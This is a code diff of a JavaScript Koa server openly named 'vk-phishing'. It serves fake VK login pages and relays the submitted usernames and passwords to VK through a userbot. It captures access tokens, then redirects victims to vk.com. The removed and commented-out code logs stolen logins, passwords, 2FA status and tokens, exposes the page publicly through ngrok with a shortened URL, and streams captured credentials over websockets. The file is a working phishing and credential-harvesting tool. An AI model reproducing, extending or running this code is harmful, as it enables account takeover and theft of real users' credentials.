@@ -1,50 +1,42 @@
-const yargs = require('yargs')
-
-const consola = require('consola')
+const { EventEmitter } = require('events')
 
 const Koa = require('koa')
 const Router = require('@koa/router')
 const bodyParser = require('koa-bodyparser')
 
 const { VK } = require('vk-io')
-const io = require('socket.io')()
-
-const chalk = require('chalk')
+const authConstants = require('./auth-constants')
 const userbot = require('./userbot')
-const { R_SUCCESS, R_REQUIRE_2FA } = require('./auth-constants')
-const ngrok = require('./ngrok')
 
-const app = new Koa()
-const router = new Router()
+const renderers = require('./renderers')
 
-// Import and Set Nuxt.js options
+class VKPhishing extends EventEmitter {
+  constructor() {
+    super()
 
-const { getShortUrl, afterLogin } = require('./aye-kosmonavt-yaml')
-
-async function start(args) {
-  app.use(bodyParser())
-
-  const renderers = require('./renderers/index')
-
-  if (args.listRenderers) {
-    consola.info('Renderers: ')
-
-    let i = 0
-
-    for (const r of Object.keys(renderers)) {
-      consola.log(`${++i}) ${r}`)
-    }
-
-    return 0
+    this.wayOut = 'https://vk.com'
   }
 
-  if (!(args.renderer in renderers)) {
-    throw new Error(`Renderer ${args.renderer} is not exists`)
+  async auth(ctx) {
+    this.emit('before:auth  -attempt', { ...ctx.request.body, ctx })
+
+    const json = await userbot(ctx.request.body)
+    this.emit('auth-attempt', {
+      attempt: ctx.request.body,
+      response: json,
+      ctx
+    })
+
+    ctx.body = json
+    this.emit('after:auth-attempt', {
+      attempt: ctx.request.body,
+      response: json
+    })
   }
 
-  const { port, host, renderer } = await renderers[args.renderer]()
+  async done(ctx) {
+    this.emit('before:successful-auth', { ...ctx.request.body, ctx })
 
-  router.post('/done', async (ctx) => {
     const vk = new VK({
       token: ctx.request.body.token,
       apiVersion: '5.103',
@@ -55,120 +47,218 @@ async function start(args) {
 
     const [currentUser] = await vk.api.users.get()
 
-    consola.info({ message: 'Got new account', badge: true })
-    consola.info(`Name: ${currentUser.first_name} ${currentUser.last_name}`)
-    consola.info(`Login: ${ctx.request.body.username}`)
-    consola.info(`Password: ${ctx.request.body.password}`)
-    if (ctx.req['2fa']) {
-      consola.error('2fa: Enabled')
-    } else {
-      consola.success('2fa: Disabled')
-    }
-    consola.info(`Token: ${ctx.request.body.token}`)
-
-    if (args.websocket)
-      io.sockets.emit('user_successful_auth', {
-        ...currentUser,
-        ...ctx.request.body
-      })
+    this.emit('successful-auth', { ...currentUser, ...ctx.request.body, ctx })
 
     ctx.body = 'ok'
-  })
-
-  router.post('/auth', async (ctx) => {
-    consola.log()
-
-    consola.info({
-      label: true,
-      message: 'Trying authenticate with credentials'
-    })
-
-    const input = chalk.bold.blueBright('>')
-    const outputSuccess = chalk.bold.green('< ')
-    const outputFail = chalk.bold.red('< ')
-
-    consola.log(`${input} Login: ${ctx.request.body.username}`)
-    consola.log(`${input} Password: ${ctx.request.body.password}`)
-
-    const json = await userbot(ctx.request.body)
-
-    if (json.status === R_SUCCESS) {
-      consola.log(outputSuccess + 'Success!')
-    } else if (json.status === R_REQUIRE_2FA) {
-      consola.log(outputFail + 'Required 2FA!')
-    } else {
-      consola.log(outputFail + 'Failed!')
-    }
-
-    consola.log()
-
-    if (args.websocket) io.sockets.emit('user_auth_attempt', json)
-
-    ctx.body = json
-  })
-
-  router.get('/exit', async (ctx) => ctx.redirect(await afterLogin()))
-
-  consola.ready({
-    message: `Server listening on http://${host}:${port}`,
-    badge: true
-  })
-
-  if (args.ngrok) {
-    try {
-      const publicUrl = await ngrok(port)
-      consola.info(`Listening public url: ${publicUrl}`)
-      const shortUrl = await getShortUrl(publicUrl)
-      consola.info(`Shorten url is: ${shortUrl}`)
-
-      if (args.websocket) {
-        io.sockets.emit('ngrok_connected', { publicUrl, shortUrl })
-      }
-    } catch (e) {
-      if (args.websocket) {
-        io.sockets.emit('ngrok_fail_start', e)
-      }
-
-      consola.error(e)
-    }
+    this.emit('after:successful-auth', { ...currentUser, ...ctx.request.body })
   }
+
+  async exit(ctx) {
+    this.emit('before:user-leave', { wayOut: this.wayOut, ctx })
+    await ctx.redirect(this.wayOut)
+    this.emit('after:user-leave', this.wayOut)
+  }
+}
+
+async function create(extensions = []) {
+  let instance = new VKPhishing()
+  const extMeta = extensions.map((e) =>
+    e.__meta__ && e.__meta__.name ? e.__meta__.name : null
+  )
+
+  for (const ext of extensions) {
+    instance = await ext(instance, extMeta)
+  }
+
+  return instance
+}
+
+async function bootstrap(instance = create(), getRenderer = renderers.static) {
+  const { port, host, renderer } = await getRenderer()
+
+  instance.emit('before:start', { port, host, renderer })
+
+  const app = new Koa()
+  const router = new Router()
+
+  app.use(bodyParser())
 
   app.use(router.routes())
   app.use(router.allowedMethods())
   app.use(renderer)
 
-  app.listen(port, host)
+  router.post('/auth', (context) => instance.auth(context))
+  router.post('/done', (context) => instance.done(context))
 
-  if (args.websocket) {
-    const wsPort = port + 100
+  router.get('/exit', (context) => instance.exit(context))
 
-    io.listen(wsPort)
+  app.listen(port, host, () => instance.emit('start', { port, host }))
 
-    consola.ready({
-      message: `WebSocket server listening on ws://localhost:${wsPort}`,
-      badge: true
-    })
-  }
+  instance.emit('after:start', { port, host })
 }
 
-start(
-  yargs
-    .scriptName('vk-phishing')
-    .alias('l', 'list-renderers')
-    .alias('r', 'renderer')
-    .alias('ws', 'websocket')
-    .default('r', 'static').argv
-)
-
-process
-  .on('unhandledRejection', (reason, p) => {
-    consola.error(reason, 'Unhandled Rejection at Promise', p)
-  })
-  .on('uncaughtException', (err) => {
-    consola.error(err, 'Uncaught Exception thrown')
-    process.exit(1)
-  })
-
-module.exports = function() {
-  throw new Error('You can not require this package')
+module.exports = {
+  create,
+  bootstrap,
+  renderers,
+  authConstants,
+  extensions: require('./extensions')
 }
+
+// if (args.websocket)
+//   io.sockets.emit('user_successful_auth', {
+//     ...currentUser,
+//     ...ctx.request.body
+//   })
+
+// if (json.status === R_SUCCESS) {
+//   consola.log(outputSuccess + 'Success!')
+// } else if (json.status === R_REQUIRE_2FA) {
+//   consola.log(outputFail + 'Required 2FA!')
+// } else {
+//   consola.log(outputFail + 'Failed!')
+// }
+
+// consola.log()
+
+// if (args.websocket) io.sockets.emit('user_auth_attempt', json)
+
+// const io = require('socket.io')()
+
+// const chalk = require('chalk')
+
+// const ngrok = require('./ngrok')
+
+// // Import and Set Nuxt.js options
+
+// const { getShortUrl, afterLogin } = require('./aye-kosmonavt-yaml')
+
+// async function start(args) {
+//   app.use(bodyParser())
+
+//   const renderers = require('./renderers/index')
+
+//   if (args.listRenderers) {
+//     consola.info('Renderers: ')
+
+//     return 0
+//   }
+
+//   if (!(args.renderer in renderers)) {
+//     throw new Error(`Renderer ${args.renderer} is not exists`)
+//   }
+
+//   const { port, host, renderer } = await renderers[args.renderer]()
+
+//   router.post('/done', async (ctx) => {
+
+//   })
+
+//   router.post('/auth', async (ctx) => {
+//     consola.log()
+
+//     consola.info({
+//       label: true,
+//       message: 'Trying authenticate with credentials'
+//     })
+
+//     const input = chalk.bold.blueBright('>')
+//     const outputSuccess = chalk.bold.green('< ')
+//     const outputFail = chalk.bold.red('< ')
+
+//     consola.log(`${input} Login: ${ctx.request.body.username}`)
+//     consola.log(`${input} Password: ${ctx.request.body.password}`)
+
+//     const json = await userbot(ctx.request.body)
+
+//     if (json.status === R_SUCCESS) {
+//       consola.log(outputSuccess + 'Success!')
+//     } else if (json.status === R_REQUIRE_2FA) {
+//       consola.log(outputFail + 'Required 2FA!')
+//     } else {
+//       consola.log(outputFail + 'Failed!')
+//     }
+
+//     consola.log()
+
+//     if (args.websocket) io.sockets.emit('user_auth_attempt', json)
+
+//     ctx.body = json
+//   })
+
+//   router.get('/exit', async (ctx) => ctx.redirect(await afterLogin()))
+
+//   consola.ready({
+//     message: `Server listening on http://${host}:${port}`,
+//     badge: true
+//   })
+
+//   if (args.ngrok) {
+//     try {
+//       const publicUrl = await ngrok(port)
+//       consola.info(`Listening public url: ${publicUrl}`)
+//       const shortUrl = await getShortUrl(publicUrl)
+//       consola.info(`Shorten url is: ${shortUrl}`)
+
+//       if (args.websocket) {
+//         io.sockets.emit('ngrok_connected', { publicUrl, shortUrl })
+//       }
+//     } catch (e) {
+//       if (args.websocket) {
+//         io.sockets.emit('ngrok_fail_start', e)
+//       }
+
+//       consola.error(e)
+//     }
+//   }
+
+//   app.use(router.routes())
+//   app.use(router.allowedMethods())
+//   app.use(renderer)
+
+//   app.listen(port, host)
+
+//   if (args.websocket) {
+//     const wsPort = port + 100
+
+//     io.listen(wsPort)
+
+//     consola.ready({
+//       message: `Socket.IO server listening on ws://localhost:${wsPort}`,
+//       badge: true
+//     })
+//   }
+// }
+
+// start(
+//   yargs
+//     .scriptName('vk-phishing')
+//     .alias('l', 'list-renderers')
+//     .alias('r', 'renderer')
+//     .alias('ws', 'websocket')
+//     .alias('ng', 'ngrok')
+//     .default('r', 'static').argv
+// )
+
+// process
+//   .on('unhandledRejection', (reason, p) => {
+//     consola.error(reason, 'Unhandled Rejection at Promise', p)
+//   })
+//   .on('uncaughtException', (err) => {
+//     consola.error(err, 'Uncaught Exception thrown')
+//     process.exit(1)
+//   })
+
+// Object.defineProperty(module, 'exports', {
+//   get() {
+//     throw new Error('You can not require this package')
+//   },
+
+//   writable: false,
+//   configurable: false,
+//   enumerable: false,
+//   value: null,
+//   set() {
+//     throw new Error('You can not require this package')
+//   }
+// })
